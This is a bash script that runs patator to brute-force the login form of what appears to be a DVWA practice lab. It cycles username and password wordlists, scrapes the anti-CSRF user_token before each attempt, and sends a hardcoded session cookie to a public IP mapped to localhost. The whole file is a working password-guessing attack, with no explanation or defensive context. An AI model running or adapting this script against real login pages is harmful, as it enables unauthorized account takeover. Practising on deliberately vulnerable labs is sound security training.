#!/bin/bash
  
patator http_fuzz method="GET" --threads=1 resolve=localhost:34.229.153.186 \
url="http://localhost/vulnerabilities/brute/?username=FILE1&password=FILE0&Login=Login&user_token=EXTRACTED_TOKEN" \
header="Cookie: PHPSESSID=espk3ffpbugm353q6f2bg2e82e; security=low" \
1="passwords.txt" \
0="usernames.txt" \
-x ignore:fgrep="Username and/or password incorrect." \
before_urls="http://localhost/vulnerabilities/brute/" \
before_egrep="EXTRACTED_TOKEN:<input type='hidden' name='user_token' value='(\w+)' />" \
before_header="Cookie: PHPSESSID=espk3ffpbugm353q6f2bg2e82e; security=high"